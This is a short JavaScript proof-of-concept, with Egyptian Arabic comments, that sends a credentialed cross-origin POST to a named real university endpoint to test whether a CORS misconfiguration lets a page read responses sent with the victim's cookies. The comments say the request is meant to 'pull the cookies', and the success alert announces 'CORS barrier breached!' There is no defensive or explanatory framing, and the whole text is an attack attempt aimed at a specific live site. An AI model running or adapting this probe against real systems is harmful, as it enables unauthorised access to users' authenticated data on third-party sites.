fetch('https://iisv2.ucsiuniversity.edu.my/cdn-cgi/rum', {
    method: 'POST', // لازم POST زي التقرير
    mode: 'cors',
    credentials: 'include', // عشان يسحب الكوكيز
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({"memory":{}}) // بيانات وهمية تشبه اللي في التقرير
})
.then(response => {
    console.log("Response Status:", response.status);
    return response.text();
})
.then(data => {
    alert("تم اختراق حاجز CORS! البيانات: " + data);
})
.catch(err => console.error("للاسف لسه فيه حماية:", err));
